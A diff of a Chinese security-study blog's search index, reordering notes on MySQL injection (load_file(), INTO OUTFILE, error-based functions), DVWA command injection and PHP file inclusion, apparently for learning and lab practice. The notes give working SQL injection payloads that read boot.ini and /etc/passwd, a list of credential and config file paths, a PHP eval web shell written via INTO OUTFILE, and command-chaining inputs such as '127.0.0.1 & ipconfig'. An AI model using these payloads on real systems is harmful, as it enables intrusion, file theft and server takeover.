@@ -1,111 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Mysql注入中load_file()与select into outfile命令</title>
-    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
-<span id="more"></span>
-
-<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
-<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
-<p>我们构造**$id**为：</p>
-<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
-<p>我们的查询语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
-<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
-<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
-<p>所以上面的语句就变成：</p>
-<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
-<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
-<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
-<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
-<p>2、能够使用union （需要mysql 3以上的版本）</p>
-<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
-<p>后天条件需要二个：</p>
-<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
-<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
-<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
-<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
-<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
-<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
-<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
-<p>而无法查看到代码。</p>
-<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
-<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
-<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
-<p>apache文件。</p>
-<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
-<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
-<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
-<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
-<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
-<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
-<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
-<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
-<p>14、/etc/my.cnf Mysql的配置文件</p>
-<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
-<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
-<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
-<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
-<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
-<p><strong>其中，into outfile的使用前提是：</strong></p>
-<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
-<p>2.要有file权限，默认情况下只有root权限有</p>
-<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
-<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
-<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
-<p>1.直接写进文件里</p>
-<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
-<p>2.修改文件结尾</p>
-<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
-<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
-<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
-<p>查版本号</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
-<p>蚁剑连接</p>
-<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
-<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
-    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
-<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
-<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
-<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
-<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
-<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DVWA靶场（待补充）</title>
     <url>/2023/01/07/DVWA%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%BE%85%E8%A1%A5%E5%85%85%EF%BC%89/</url>
     <content><![CDATA[<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; ipconfig　　　　先执行127.0.0.1，不管127.0.0.1是否执行成功都会执行ipconfig</span><br><span class="line">127.0.0.1 &amp;&amp; ipconfig　　  先执行127.0.0.1，127.0.0.1执行成功后才会执行ipconfig</span><br><span class="line">127.0.0.1 | ipconfig　　　　不管127.0.0.1执行是否成功都会执行ipconfig</span><br><span class="line">127.0.0 || ipconfig　　　   前面的命令要执行失败，才可以执行后面的命令</span><br><span class="line">执行 ping 127.0.0.1 ; ipconfig Linux下分隔符</span><br></pre></td></tr></table></figure>
@@ -465,6 +360,111 @@
       </categories>
       <tags>
         <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入中load_file()与select into outfile命令</title>
+    <url>/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h1><p>查看某个文件的内容</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669856332515-8f2af14e-b76a-4933-a200-921a3c79dceb.png" alt="img"></p>
+<span id="more"></span>
+
+<p>看过<strong>《SQL Injection with MySQL》</strong>的朋友肯定知道用char()函数或者把字符转换成16进制。</p>
+<p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p>
+<p>我们构造**$id**为：</p>
+<p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是”c:/boot.ini”的ASCII代码。</p>
+<p>我们的查询语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p>
+<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
+<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,16进制前需要加<strong>0x</strong></p>
+<p>所以上面的语句就变成：</p>
+<p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p>
+<p>在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用<strong>into outfile</strong>把文件导出</p>
+<p>关于<strong>mysql into outfile</strong>注射，要使用into outfile把代码写到web目录取得webshell首先需要3大先天条件：</p>
+<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
+<p>2、能够使用union （需要mysql 3以上的版本）</p>
+<p>3、对方没有对（’）进行过滤（因为outfile后面的（’’）不可以用其他函数代替转换）</p>
+<p>后天条件需要二个：</p>
+<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
+<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x</p>
+<p>也就是说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的</p>
+<h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>mysql的load_file()常见的用法：</p>
+<p>1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</p>
+<p>2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>
+<p>上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如”&lt;”替换成”空格”,返回的是网页。</p>
+<p>而无法查看到代码。</p>
+<p>3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</p>
+<p>4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache<a href="https://cloud.tencent.com/product/lighthouse?from=10680">虚拟主机</a>配置文件。</p>
+<p>5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</p>
+<p>apache文件。</p>
+<p>6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</p>
+<p>7、/usr/local/resin/conf/resin.cof 查看linux系统配置的JSP虚拟主机</p>
+<p>8、../themes/darkblue_orange/layout.inc.php phpmyadmin爆路径</p>
+<p>9、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</p>
+<p>10、/usr/local/resin-3.0.22/conf/resin.conf 或 /usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
+<p>11、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf Apache虚拟主机查看</p>
+<p>12、/etc/sysconfig/iptables 查看防火墙策略</p>
+<p>13、usr/local/app/php5/lib/php.ini PHP的设置</p>
+<p>14、/etc/my.cnf Mysql的配置文件</p>
+<p>15、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</p>
+<p>16、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP</p>
+<p>17、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf 虚拟网站设置</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1918345">https://cloud.tencent.com/developer/article/1918345</a></p>
+<h1 id="select-into-outfile命令"><a href="#select-into-outfile命令" class="headerlink" title="select into outfile命令"></a>select into outfile命令</h1><p>在mysql数据库中存在mysql select into outfile命令，该命令与load data infile命令作用恰好相反。该命令的作用是将被选择的一行写入一个文件中。（文件被创建到服务器主机上）</p>
+<p>但是，需要注意的是：into outfile和load_file()两种方式的利用都是具有局限性的。</p>
+<p><strong>其中，into outfile的使用前提是：</strong></p>
+<p>1.<strong>要知道网站的绝对路径，可以通过报错信息、phpinfo界面、404界面等一些方式知道</strong></p>
+<p>2.要有file权限，默认情况下只有root权限有</p>
+<p>3.对目录要有写权限，一般image之类的存放图片的目录有写权限</p>
+<p>还要注意的是：写的文件名一定是在网站中不存在的，不然也会不成功</p>
+<p><strong>select …… into outfile ‘filename’常见的利用方式：</strong></p>
+<p>1.直接写进文件里</p>
+<p>select version() into outfile “绝对路径”,其中version()可以换成其余的查询数据库信息的函数 version()左右不需要加单引号</p>
+<p>2.修改文件结尾</p>
+<p>select ‘<?php @eval($_POST['cmd']);?>‘ into outfile “xxx/test.php”,这里需要获取到网站在系统中的具体路径(绝对路径)  写入内容需要加单引号(不能加双引号)</p>
+<p>那么好，现在我们知道了select…… into outfile的利用方法了</p>
+<p>首先，根据前面几题的经验，我们可以知道该网站目录的绝对路径，且用户是root权限的。那么就满足了我们使用outfile 去获取网站信息的使用前提条件</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858312565-d4c63848-3797-4e5a-9c09-b82ecc558e85.png" alt="img"></p>
+<p>查版本号</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858348161-3f7bdfcd-aa20-4aa6-ab24-937ba23497ea.png" alt="img"></p>
+<p>蚁剑连接</p>
+<p><img src="/2023/01/07/Mysql%E6%B3%A8%E5%85%A5%E4%B8%ADload-file-%E4%B8%8Eselect-into-outfile%E5%91%BD%E4%BB%A4/1669858460854-566981f4-0498-4403-9def-65d7d09a66d7.png" alt="img"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/275874.html">https://www.freebuf.com/articles/web/275874.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL报错注入值之extractvalue()、updatexml()、floor()函数</title>
+    <url>/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="extractvalue-、updatexml"><a href="#extractvalue-、updatexml" class="headerlink" title="extractvalue()、updatexml()"></a>extractvalue()、updatexml()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207949127-cfa24f4d-e8ca-4725-919d-42499840042a.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206958969-003b3e15-ed10-46a0-bf41-7558055941fd.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670207004068-6f2f02ac-6399-4a3d-9301-14c6e6f18b11.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1670206895067-49081e1a-3523-4424-ae84-d142b23d1426.png" alt="img"></p>
+<p><a href="https://cloud.tencent.com/developer/article/1740429">https://cloud.tencent.com/developer/article/1740429</a></p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892278118-1283c261-35a2-432c-8bc2-c5c5d7c500f3.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892290951-cdbc385d-a31c-4773-ac64-25e95cbe9b6e.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892309665-0e7152f2-41f7-48d4-ab7d-3782c026b6b7.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892339316-354aff9b-6ad6-4af0-b54e-783de8de5a80.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892353133-6fc1b68d-bc4c-4d55-b9f5-5ec23eef2c6b.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892378736-8b68f3a9-3936-4e9c-a675-0923a3254010.png" alt="img"></p>
+<p><img src="/2023/01/07/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%80%BC%E4%B9%8Bextractvalue-%E3%80%81updatexml-%E3%80%81floor-%E5%87%BD%E6%95%B0/1672892459753-24ac857d-3238-4124-b118-7d9d6dda13d5.png" alt="img"></p>
+<p><a href="https://www.freebuf.com/articles/web/257881.html">https://www.freebuf.com/articles/web/257881.html</a></p>
+<p><a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1784,6 +1784,28 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>文件包含常用函数</title>
+    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p>include()</p>
+<p>require()</p>
+<p>fopen()</p>
+<p>include_once()</p>
+<p>require_once()</p>
+<p>readfile()</p>
+<span id="more"></span>
+
+<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
+<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
+<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>本地文件包含与远程文件包含</title>
     <url>/2023/01/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h2 id="1-本地文件包含漏洞"><a href="#1-本地文件包含漏洞" class="headerlink" title="1.本地文件包含漏洞"></a>1.本地文件包含漏洞</h2><p>  本地文件包含（LFI）漏洞是PHP中一种典型的高危漏洞。由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web服务器将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
@@ -1798,28 +1820,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>(3）被包含的变量前没有目录的限制</p>
 <h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><p>(1）远程包含文件路径必须为绝对路径</p>
 <p>(2）被包含的文件不能够被服务器解析，如php文件</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含常用函数</title>
-    <url>/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<p>include()</p>
-<p>require()</p>
-<p>fopen()</p>
-<p>include_once()</p>
-<p>require_once()</p>
-<p>readfile()</p>
-<span id="more"></span>
-
-<h2 id="include-与require-区别"><a href="#include-与require-区别" class="headerlink" title="include()与require()区别"></a>include()与require()区别</h2><p>当包含一个不存在的文件时，include会报错，但是下面的语句正常执行，而require就会报错并停止脚步继续执行。</p>
-<h2 id="include-once-与require-once-区别"><a href="#include-once-与require-once-区别" class="headerlink" title="include_once()与require_once()区别"></a>include_once()与require_once()区别</h2><p>当之前包含过一个文件时，就不会再包含了</p>
-<h2 id="fopen-与readfile"><a href="#fopen-与readfile" class="headerlink" title="fopen()与readfile()"></a>fopen()与readfile()</h2><p><img src="/2023/01/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/1672882660228-68caa210-f9c8-4e8a-bf9b-faa0ea17a1ee.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>文件包含</category>
@@ -1944,6 +1944,161 @@ include('files/'.$action.'.php'); //载入相应文件
 <h1 id="什么是CDN："><a href="#什么是CDN：" class="headerlink" title="什么是CDN："></a>什么是CDN：</h1><p>cdn全称是内容分发网络。其目的是让用户能够更快速的得到请求的数据。简单来讲，cdn就是用来加速的，他能让用户就近访问数据，这样就更更快的获取到需要的数据。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个cdn服务器，上面缓存住一些数据，深圳用户访问时先访问这个cdn服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了<br>CDN与DNS的关系：</p>
